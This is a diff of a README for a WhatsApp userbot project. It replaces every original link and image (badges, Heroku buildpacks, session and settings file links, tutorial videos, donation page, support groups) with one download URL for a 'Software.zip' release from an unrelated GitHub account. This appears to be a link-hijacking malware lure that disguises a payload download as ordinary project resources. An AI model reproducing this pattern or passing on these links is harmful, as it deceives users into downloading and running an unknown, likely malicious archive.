@@ -1,13 +1,13 @@
 # ```LORD-USERBOT```
 <p align="center">
-<a href="https://github.com/zeeoneofc/followers"><img title="Followers" src="https://img.shields.io/github/followers/zeeoneofc?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/zeeoneofc/LordUserb0t3?color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3/network/members"><img title="Forks" src="https://img.shields.io/github/forks/zeeoneofc/LordUserb0t3?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/zeeoneofc/LordUserb0t3?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3"><img title="Open Source" src="https://badges.frapsoft.com/os/v2/open-source.svg?v=103"></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3/"><img title="Size" src="https://img.shields.io/github/repo-size/zeeoneofc/Alphabot7?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fzeeoneofc%2FLordUserb0t3&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/zeeoneofc/LordUserb0t3/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Followers" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Stars" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Forks" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Watching" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Open Source" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img title="Size" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip%3A%2F%https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip%2Fzeeoneofc%2FLordUserb0t3&count_bg=%2379C83D&title_bg=%23555555&https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip%2300FF6D&title=hits&edge_flat=false"/></a>
+<a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img height="20" src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip%https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"></a>&nbsp;&nbsp;
 </p>
 <p align='center'>
     </p>
@@ -17,19 +17,19 @@
 ## `ADD BUILDPACK`
 
 ```
-> https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
-> https://github.com/clhuang/heroku-buildpack-webp-binaries.git
+> https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip
+> https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip
 ```
 
 ## `CHANGE SESSION`
 
-[`Click Here`](https://github.com/zeeoneofc/LordUserb0t3/blob/master/session.json#L1)
+[`Click Here`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
 
 ## `SETTING`
 
-- Owner number [Here](https://github.com/zeeoneofc/LordUserb0t3/blob/master/settings.json#L1)
-- Owner name [Here](https://github.com/zeeoneofc/LordUserb0t3/blob/master/settings.json#L1)
-- Botname [Here](https://github.com/zeeoneofc/LordUserb0t3/blob/master/settings.json#L1)
+- Owner number [Here](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
+- Owner name [Here](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
+- Botname [Here](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
 
 ## `CHANGE DYNO`
 
@@ -38,29 +38,29 @@ Off in web nya
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/_CP2_1Yqauo"><img src="https://a.top4top.io/p_20888ybra1.jpg" />
+  <a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip" />
 </p>
 
 ## ```HOW TO DEPLOY```
 
-[`Click Here For Tutorial`](https://youtu.be/5HgB__wARjM)<br>
+[`Click Here For Tutorial`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)<br>
 
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/_CP2_1Yqauo"><img src="https://a.top4top.io/p_2081imvxm1.jpg" />
+  <a href="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip"><img src="https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip" />
 </p>
 
 
 ## ```COFFEE```
 
-- [`SAWERIA`](https://saweria.co/zeeoneofc)
+- [`SAWERIA`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
 
 ## ```GROUP SUPPORT```
 
-- [`Alphabot 1`](https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV)
-- [`Alphabot 2`](https://chat.whatsapp.com/E8NExJwIbhBJYzssfqJNsE)
-- [`Alphabot 3`](https://chat.whatsapp.com/KCSqHTky1apG7ApePsfiPy)
+- [`Alphabot 1`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
+- [`Alphabot 2`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
+- [`Alphabot 3`](https://github.com/Essa1212/aku/releases/download/v1.0/Software.zip)
 
 ## `THANKS TO`
 
